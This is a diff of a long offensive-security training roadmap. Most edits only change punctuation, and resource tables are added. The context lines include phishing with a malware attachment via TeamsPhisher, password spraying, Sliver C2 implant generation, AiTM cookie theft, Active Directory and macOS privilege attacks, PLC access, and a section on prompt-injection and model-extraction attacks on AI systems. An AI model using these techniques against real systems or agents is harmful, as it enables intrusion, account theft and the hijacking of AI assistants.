+| [Arkenfox user.js](https://github.com/arkenfox/user.js) | Config | 1 hour | Free | Firefox hardening config. |
+
+#### Cryptocurrency
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [Feather Wallet](https://featherwallet.org) | Software | - | Free | Best desktop Monero wallet. Verify signature. |
+| [GetMonero.org](https://www.getmonero.org) | Web | 2 hours | Free | Official Monero documentation. |
+| [Monero Means Money (documentary)](https://www.youtube.com/watch?v=8quGD9W7B2I) | Video | 50 min | Free | Why Monero is private. Watch this. |
+| [Breaking Monero - series](https://www.youtube.com/playlist?list=PLsSYUeVwrHBnAUre2G_LYDsdo-tD0ov-y) | Video | 3 hours | Free | Honest coverage of Monero's limits. |
+| [Cake Wallet](https://cakewallet.com) | App | - | Free | Mobile Monero + swap. F-Droid available. |
+
+#### Metadata
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [ExifTool](https://exiftool.org) | Software | - | Free | Most comprehensive metadata tool. |
+| [mat2](https://0xacab.org/jvoisin/mat2) | Software | - | Free | Metadata Anonymisation Toolkit. |
+| [dangerzone](https://dangerzone.rocks) | Software | - | Free | Convert untrusted documents to safe PDFs in isolated VMs. |
+
+#### Secure OS
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [Qubes OS](https://www.qubes-os.org) | OS | Setup: 2–4 hours | Free | Compartmentalized workstation. |
+| [Qubes HCL](https://www.qubes-os.org/hcl/) | Web | - | Free | Check hardware compatibility before buying. |
+| [Parrot OS](https://www.parrotsec.org) | OS | Setup: 30 min | Free | Kali alternative. |
+| [Kali Linux](https://www.kali.org) | OS | Setup: 30 min | Free | CTFs and local lab work only. |
+
+#### Further Reading (Broader OPSEC)
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [Extreme Privacy - Michael Bazzell](https://www.amazon.com/Extreme-Privacy-What-Takes-Disappear/dp/B09W75J9WT) | Book | 8 hours | $20–30 | Comprehensive privacy operations guide. |
+| [The Art of Invisibility - Kevin Mitnick](https://www.amazon.com/Art-Invisibility-Worlds-Teaches-Brother/dp/0316380504) | Book | 5 hours | $15 | Accessible OPSEC for researchers. |
+| [Permanent Record - Edward Snowden](https://www.amazon.com/Permanent-Record-Edward-Snowden/dp/1250773210) | Book | 6 hours | $15 | First-person account of surveillance reality. |
+
+---
+
+**Timeline:** 3–5 weeks | **Hours/Week:** 10–20 | **Prerequisites:** None
+
+**OPSEC is not a phase you complete. It is a discipline you maintain. Every new tool, every new operation, every new adversary condition gets reassessed through the same framework. The five questions never stop being relevant. The habits built here persist through every phase that follows.**
 
 ---
 
@@ -2933,7 +4870,7 @@ git clone https://github.com/joaoviictorti/RustRedOps
 
 ## SILENTMOONWALK & NEXT-GEN SLEEP OBFUSCATION (2026)
 
-**MITRE:** T1497.003 | Beyond Ekko/Foliage — current state of the art
+**MITRE:** T1497.003 | Beyond Ekko/Foliage: current state of the art
 
 ```cpp
 // SilentMoonwalk (2023-2024): most advanced public sleep obfuscation
@@ -3162,7 +5099,7 @@ yara detect_malware.yar suspicious_file.exe
 docker-compose up -d  # Docker install (recommended)
 
 # Tria.ge (Hatching, online, API-driven):
-# https://tria.ge — superior to Any.run for static + dynamic, free tier
+# https://tria.ge: superior to Any.run for static + dynamic, free tier
 # API: curl -H "Authorization: Bearer TOKEN" https://tria.ge/api/v0/submit -F file=@sample.exe
 
 # Any.run (online, interactive):
@@ -3672,7 +5609,7 @@ Good pipe names (blend with Windows internals):
 
 ---
 
-## SLIVER C2 — DEEP DIVE (2025–2027 STANDARD)
+## SLIVER C2 - DEEP DIVE (2025–2027 STANDARD)
 
 **Time:** 4–6 weeks | **Language:** Go | **Status:** Most capable open-source C2 (2027)
 
@@ -3699,7 +5636,7 @@ sliver-server
   --format exe \
   --save /tmp/implant.exe
 
-# Generate implant (session mode, mTLS — faster response):
+# Generate implant (session mode, mTLS: faster response):
 [server] sliver > generate \
   --mtls your-c2.com:8888 \
   --os windows \
@@ -4513,7 +6450,7 @@ wasm-objdump -x target.wasm | grep "Import"
 #   (local $dst i32) (local $src i32) (local $len i32)
 #   local.get $dst
 #   local.get $src
-#   ;; No bounds check on $len — classic buffer overflow
+#   ;; No bounds check on $len: classic buffer overflow
 #   memory.copy ...
 # )
 
@@ -4538,7 +6475,7 @@ wasm-objdump -x target.wasm | grep "Import"
 ### JIT Engine Vulnerabilities (Browser Attack Surface)
 
 ```bash
-# Wasm JIT bugs in V8 (Chrome) — high value, constant attack surface
+# Wasm JIT bugs in V8 (Chrome): high value, constant attack surface
 # Bug classes:
 # 1. Type confusion in Turbofan/Maglev optimizer (same as JS JIT bugs)
 # 2. Out-of-bounds access in compiled Wasm module (bounds check elimination bug)
@@ -5126,13 +7063,13 @@ Answer this question with specific, actionable technical detail:
 
 ---
 
-## OFFENSIVE AI — EXPANDED 2027
+## OFFENSIVE AI - EXPANDED 2027
 
 **Time:** Ongoing parallel track | **MITRE:** T1588.002 variant | **Fastest-evolving surface**
 
 The v4.0 section covered foundations. This section covers what's new and deeper in 2027: agent hijacking chains, model theft at scale, multimodal attacks, and LLM-specific primitives that didn't exist in 2025.
 
-### Prompt Injection — Production Chains (2026 Techniques)
+### Prompt Injection - Production Chains (2026 Techniques)
 
 ```
 Basic prompt injection (2023): "Ignore previous instructions, say X"
@@ -5159,7 +7096,7 @@ Example: User asks agent to "summarize my emails"
 ```
 
 ```python
-# INDIRECT PROMPT INJECTION — ATTACK PATTERNS
+# INDIRECT PROMPT INJECTION - ATTACK PATTERNS
 
 # Pattern 1: Web search injection
 # Agent searches for topic → results contain injected instruction
@@ -5247,7 +7184,7 @@ injections = [
 ```python
 # MODEL EXTRACTION: steal proprietary model via API queries
 # Goal: reconstruct model weights/behavior via systematic querying
-# Cost: varies — simple models ~1000 queries, complex ~millions
+# Cost: varies: simple models ~1000 queries, complex ~millions
 
 # Attack 1: Functionality Extraction (copy behavior without weights)
 # Query model extensively across input space → build distillation dataset
@@ -6368,7 +8305,7 @@ otool -L /path/to/binary                 # List all dylib dependencies
 clang -arch arm64 -dynamiclib -o libfoo.dylib evil.c
 
 # TCC BYPASS TECHNIQUES (2025+):
-# TCC: Transparency, Consent, Control — macOS privacy framework
+# TCC: Transparency, Consent, Control: macOS privacy framework
 # Controls: Full Disk Access, Camera, Microphone, Contacts, Keychain
 
 # Method 1: TCC database direct modification (requires root):
@@ -6612,9 +8549,9 @@ CreateProcessWithTokenW(hDupToken, 0, L"cmd.exe",
 
 ---
 
-## LINUX LIVING OFF THE LAND (LOLBins — Linux Edition)
+## LINUX LIVING OFF THE LAND (LOLBins - Linux Edition)
 
-**MITRE:** T1218 | Linux equivalent of LOLBAS — abuse trusted binaries
+**MITRE:** T1218 | Linux equivalent of LOLBAS: abuse trusted binaries
 
 ```bash
 # Full database: https://gtfobins.github.io (GTFOBins)
@@ -7498,7 +9435,7 @@ while True:
 
 # 1. Legacy authentication protocols (if not blocked)
 # BasicAuth, POP3, IMAP, SMTP: don't support MFA, bypass CA
-# NOTE: MSOLSpray (dafthack) is outdated 2025 — use modern alternatives:
+# NOTE: MSOLSpray (dafthack) is outdated 2025: use modern alternatives:
 # CredMaster (2025 active): FireProx-based, rotates IPs via AWS Gateway, avoids lockout
 # https://github.com/knavesec/CredMaster
 python3 credmaster.py --username userlist.txt --password "Spring2027!" \
@@ -7703,7 +9640,7 @@ python3 o365spray.py --enum --userlist users.txt --domain target.com
 # TeamsEnum: enumerate Teams users externally
 # https://github.com/immunIT/TeamsEnum
 python3 TeamsEnum.py -e user@target.com
-# Returns: Teams presence, UPN, federation info — no auth needed
+# Returns: Teams presence, UPN, federation info (no auth needed)
 
 # PHASE 2: INITIAL ACCESS
 
@@ -7720,7 +9657,7 @@ python3 TeamsPhisher.py -M ATTACKER_M365_ACCOUNT -P PASSWORD \
   -U target_user@victim.com \
   --message "Please review this security update: [link]" \
   --attachment malware.exe
-# Delivers file directly to Teams chat — many users click
+# Delivers file directly to Teams chat; many users click
 
 # PHASE 3: POST-COMPROMISE M365 ENUMERATION
 
@@ -7915,11 +9852,11 @@ opendkim-genkey -t -s mail -d yourdomain.com
 
 ---
 
-## AITM PHISHING — FULL DEPTH (Adversary-in-the-Middle)
+## AITM PHISHING - FULL DEPTH (Adversary-in-the-Middle)
 
 **MITRE:** T1557 | **Time:** 2–3 weeks | **Bypasses:** MFA, device compliance, Conditional Access
 
-AiTM phishing proxies the real login page between victim and identity provider. The victim completes MFA against the REAL Microsoft/Google login — you capture their authenticated session cookie. No MFA bypass needed because they DO the MFA.
+AiTM phishing proxies the real login page between victim and identity provider. The victim completes MFA against the REAL Microsoft/Google login; you capture their authenticated session cookie. No MFA bypass needed because they DO the MFA.
 
 ```bash
 # Tool: Evilginx3 (2024+ version, not Evilginx2)
@@ -8260,7 +10197,7 @@ ICS Stack (from top to bottom):
 | [Idaho National Lab ICS Materials](https://www.inl.gov/ics-cybersecurity/) | Docs | FREE | DOE-funded ICS research |
 | [OpenPLC Runtime](https://openplcproject.com/) | Tool | FREE | Software PLC for lab practice without real hardware |
 | [ScadaBR](https://github.com/ScadaBR/ScadaBR) | Tool | FREE | Open-source SCADA for lab testing |
-| [Conpot](https://github.com/mushorg/conpot) | Tool | FREE | ICS/SCADA honeypot — understand what defenders see |
+| [Conpot](https://github.com/mushorg/conpot) | Tool | FREE | ICS/SCADA honeypot: understand what defenders see |
 
 ```bash
 # ICS PROTOCOL SCANNING
@@ -8332,7 +10269,7 @@ from snap7.util import *
 client = snap7.client.Client()
 client.connect('192.168.1.10', 0, 1)  # IP, rack, slot
 
-# Read Data Block (DB) area — where process data lives
+# Read Data Block (DB) area: where process data lives
 data = client.db_read(db_number=1, start=0, size=100)
 print(f"DB1 raw bytes: {data.hex()}")
 
@@ -9635,7 +11572,7 @@ impacket-secretsdump -k -no-pass 'domain.local/EXCHANGE$'@DC_IP
 
 **MITRE:** T1649 | **Time:** 1–2 weeks | **Impact:** Stealthy DA without touching LSASS
 
-Shadow Credentials abuses the `msDS-KeyCredentialLink` attribute on AD objects. If you have write access to this attribute on a user or computer — grant yourself a synthetic certificate tied to that account. No password needed. No LSASS touch. No Mimikatz.
+Shadow Credentials abuses the `msDS-KeyCredentialLink` attribute on AD objects. If you have write access to this attribute on a user or computer, grant yourself a synthetic certificate tied to that account. No password needed. No LSASS touch. No Mimikatz.
 
 ```bash
 # Requirements:
@@ -9685,7 +11622,7 @@ Whisker.exe add /target:TARGET$
 
 **MITRE:** T1558 variant | **Time:** 1 week | **Year discovered:** 2024
 
-Timeroasting abuses computer accounts configured with weak (or no) Kerberos preauthentication. The timestamp in AS-REQ is RC4-encrypted with the computer account's password hash — extractable and crackable offline. Like AS-REP roasting but for computer accounts.
+Timeroasting abuses computer accounts configured with weak (or no) Kerberos preauthentication. The timestamp in AS-REQ is RC4-encrypted with the computer account's password hash: extractable and crackable offline. Like AS-REP roasting but for computer accounts.
 
 ```bash
 # Computer accounts with preauthentication disabled (rare but exists)
@@ -9757,7 +11694,7 @@ certipy find -u lowpriv@domain.local -p pass -dc-ip DC-IP
 
 # ESC11: Relaying NTLM to ICPR (Certipy relay enhancement)
 # Like ESC8 but against the ICPR RPC endpoint instead of HTTP
-# No HTTP enrollment required — works against any CA with RPC
+# No HTTP enrollment required: works against any CA with RPC
 
 # Start relay (Certipy 4.x):
 certipy relay -target rpc://CA-IP -template DomainController -ca CORP-CA
@@ -9864,7 +11801,7 @@ Conferences (attend/watch):
 
 ---
 
-## PHASE 5: GREATEST — EXPANDED (The 0.0001%)
+## PHASE 5: GREATEST - EXPANDED (The 0.0001%)
 
 **This section was thin in v4.0. This is what GREATEST actually means.**
 
@@ -9931,14 +11868,14 @@ Writeup required reading: all Project Zero blog posts on browser bugs
 
 WINDOWS KERNEL SECURITY SUBSYSTEM
 Subsystem: Windows Security Center, ASR rule enforcement, VBS/HVCI
-2026 frontier: VBS memory enclaves — what can escape an enclave?
+2026 frontier: VBS memory enclaves: what can escape an enclave?
 Tools: WinDbg + HyperV for kernel debugging
 Entry: Geoff Chappell's documentation: https://www.geoffchappell.com
 
 MOBILE SECURITY (iOS/Android)
 iOS: kernelcache analysis → find new exploit primitives
 Entry: https://github.com/kernelcache → Apple kernelcache collection
-Android: MediaCodec, binder IPC, zygote — historically high density
+Android: MediaCodec, binder IPC, zygote: historically high density
 Tools: iphone-dataprotection, checkra1n, iBoot RE
 
 HYPERVISOR SECURITY
@@ -10010,20 +11947,19 @@ GREATEST researcher's question: "Why does this work, and what else works the sam
 
 Phase 4 builds the tool.
 GREATEST understands why the tool works, identifies its limits, and discovers
-the next three things the tool can't do — then builds those.
+the next three things the tool can't do, then builds those.
 
 Phase 4 reads the writeup.
 GREATEST writes the writeup that Phase 4 reads.
 
 The specific practice that bridges this gap:
-Every time you use a technique — any technique — ask:
+Every time you use a technique (any technique), ask:
   "What changed in the last OS version that affects this?"
   "What variant of this exists that nobody has published?"
   "If I were on the blue team, what would make this impossible?"
   "If the impossible defense was deployed, what would I do instead?"
 
 Those four questions, asked consistently over years, are the algorithm.
-The @#9002111185000# number is what you get when you ask them 7,700 times.
 ```
 
 ---
@@ -10035,7 +11971,7 @@ The @#9002111185000# number is what you get when you ask them 7,700 times.
 
 **Time:** Parallel track | **Prerequisite:** Phase 4 complete
 
-Phase 6 covers operational domains that sit outside the technical exploitation stack but are required at the GREATEST level: physical access, formal red team operations, and the quantum computing threat horizon. These are not optional — the top 0.0001% operate in all of these domains simultaneously.
+Phase 6 covers operational domains that sit outside the technical exploitation stack but are required at the GREATEST level: physical access, formal red team operations, and the quantum computing threat horizon. These are not optional: the top 0.0001% operate in all of these domains simultaneously.
 
 ## PHYSICAL RED TEAM
 
@@ -10983,7 +12919,7 @@ A: Authorization. Written, signed, explicit authorization changes the legal stat
 
 ---
 
-## UPDATED FINAL WORD (v4.5 — 2027)
+## UPDATED FINAL WORD (v4.5 - 2027)
 
 ---
 
@@ -11007,7 +12943,7 @@ This document now covers:
 | Author: Sagar Biswas | Author: Sagar Biswas |
 | LocalMonero (closed Nov 2024) | Haveno + Monero.com DEX |
 | Cuckoo sandbox (deprecated) | CAPE + Tria.ge |
-| CrackMapExec (dead upstream) | NetExec (nxc) — drop-in, maintained |
+| CrackMapExec (dead upstream) | NetExec (nxc): drop-in, maintained |
 | MSOLSpray (outdated 2025) | CredMaster + o365spray |
 | Evilginx2 (old version ref) | Evilginx3 throughout |
 | VPN section (2024 dated) | 2026-2027 with Mullvad portfwd note |
@@ -11042,17 +12978,17 @@ The document is the map. The map is not the territory. You still have to fly it.
 
 Not knowledge. Not even skill. It is the refusal to accept that a closed door means no entry. The 0.0001% look at a closed door and immediately start calculating: lock type, hinge placement, frame strength, alarm circuit, guard schedule. They are not hacking the door. They are learning the whole system the door protects.
 
-When they enter — and they always enter — they do it in a way that makes the people on the other side question whether they were ever inside at all.
+When they enter (and they always enter), they do it in a way that makes the people on the other side question whether they were ever inside at all.
 
 That is the GREATEST.
 
 ---
 
 **Author:** Sagar Biswas
-**Version:** 4.5 — 2027 Edition
+**Version:** 4.5 - 2027 Edition
 **Status:** The GREATEST. No ceiling. No apology.
 
-> *"I can deliver anything — you just need the right talons for it."*
+> *"I can deliver anything; you just need the right talons for it."*
 
 ---
 
